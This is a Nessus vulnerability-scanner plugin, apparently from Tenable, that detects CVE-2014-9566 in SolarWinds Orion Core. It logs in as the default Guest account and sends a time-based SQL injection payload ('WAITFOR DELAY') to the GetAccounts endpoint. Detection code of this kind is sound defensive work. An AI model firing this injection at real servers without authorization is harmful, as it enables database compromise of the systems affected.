#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(83817);
  script_version("$Revision: 1.3 $");
  script_cvs_date("$Date: 2016/05/12 14:55:05 $");

  script_cve_id("CVE-2014-9566");
  script_bugtraq_id(72876);
  script_osvdb_id(118746);
  script_xref(name:"EDB-ID", value:"36262");

  script_name(english:"SolarWinds Orion Multiple SQLi Vulnerabilities");
  script_summary(english:"Attempts to exploit the SQL injection vulnerability.");

  script_set_attribute(attribute:"synopsis",value:
"The remote host is affected by multiple SQL injection vulnerabilities.");
  script_set_attribute(attribute:"description",value:
"The remote host is running a version of SolarWinds Orion Core that is
affected by multiple blind SQL injection vulnerabilities in the
'AccountManagement.asmx' script. A remote attacker, after being
authenticated using the built-in default 'Guest' account, can exploit
these vulnerabilities to execute arbitrary SQL commands. Note that the
'Guest' account needs to be enabled for exploitation of these
vulnerabilities to occur.");
  # http://volatile-minds.blogspot.com/2015/02/authenticated-stacked-sql-injection-in.html
  script_set_attribute(attribute:"see_also",value:"http://www.nessus.org/u?37fa2b56");
  # http://www.solarwinds.com/documentation/orion/docs/releasenotes/releasenotes.htm
  script_set_attribute(attribute:"see_also",value:"http://www.nessus.org/u?3e685d6c");
  script_set_attribute(attribute:"solution",value:
"Contact the vendor for a software version containing a patched Orion
Core.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:S/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date",value:"2015/02/24");
  script_set_attribute(attribute:"patch_publication_date",value:"2015/02/24");
  script_set_attribute(attribute:"plugin_publication_date", value:"2015/05/27");

  script_set_attribute(attribute:"plugin_type",value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:solarwinds:orion_network_performance_monitor");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:solarwinds:orion_netflow_traffic_analyzer");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:solarwinds:orion_network_configuration_manager");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:solarwinds:orion_ip_address_manager");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:solarwinds:orion_user_device_tracker");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:solarwinds:orion_voip_%26_network_quality_manager");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:solarwinds:orion_server_and_application_manager");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:solarwinds:orion_web_performance_monitor");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2015-2016 Tenable Network Security, Inc.");

  script_require_ports("Services/www", 8787);
  script_dependencies("solarwinds_orion_npm_detect.nasl");
  script_exclude_keys("global_settings/supplied_logins_only");
  script_require_keys("installed_sw/SolarWinds Orion Core");
  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");
include("url_func.inc");

# plugin requires logging in as Guest to exploit
if (supplied_logins_only) audit(AUDIT_SUPPLIED_LOGINS_ONLY);

port = get_http_port(default:8787);

app_name = "SolarWinds Orion Core";

install = get_single_install(
  app_name      : "SolarWinds Orion Core",
  port         : port
);

dir = install['path'];
install_url = build_url(qs:dir, port:port);

clear_cookiejar();

login_url = '/Orion/Login.aspx';

res = http_send_recv3(
  port            : port,
  method          : "GET",
  item            : login_url,
  exit_on_fail    : TRUE
);

item = eregmatch(pattern:'"__VIEWSTATE"\\s*value\\s*=\\s*"([^"]+)"',
                 string: res[2]);

viewstate = item[1];

postdata = "__EVENTTARGET=&" +
           "__EVENTARGUMENT=&" +
           "__VIEWSTATE=" + urlencode(str:viewstate) + "&" +
           "__VIEWSTATEGENERATOR=01070692&" +
           "ctl00$BodyContent$Username=Guest&" +
           "ctl00$BodyContent$Password=";

res = http_send_recv3(
  port            : port,
  method          : "POST",
  item            : login_url,
  data            : postdata,
  content_type    : "application/x-www-form-urlencoded",
  exit_on_fail    : TRUE
);

if(res[1] !~ "Location\s*:\s*/Orion/View.aspx" &&
   "302" >!< res[0])
  exit(0, "Unable to login to application using Guest Account.");

exploit_url = "/Orion/Services/AccountManagement.asmx/GetAccounts";

# script response is pretty snappy, so use a non-overlapping variance
variance = 2;

passes = 0;
timings = make_list(5,10,15);
postdata = '{"accountId":""}';

# check more than one timing to avoid false positives
foreach timing (timings)
{
  http_set_read_timeout(timing*2);

  exploit = "?sort=Accounts.AccountID&dir=ASC%20WAITFOR%20DELAY%20%270:0:" + timing + "%27--";

  then = unixtime();

  res = http_send_recv3(
    port            : port,
    method          : "POST",
    item            : exploit_url + exploit,
    data            : postdata,
    content_type    : "application/json",
    exit_on_fail    : TRUE
  );

  now = unixtime();
  delta = now - then;

  if('"SolarWinds.Orion.Web.PageableDataTable"' >< res[2] &&
     delta >= timing && delta <= timing + variance)
    passes++;
}

if(passes == max_index(timings))
{
  security_report_v4(
    port     : port,
    sqli     : TRUE,
    request  : make_list(http_last_sent_request()),
    output   : chomp(res[2]),
    severity : SECURITY_HOLE,
    generic  : TRUE
  );
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, app_name, install_url);
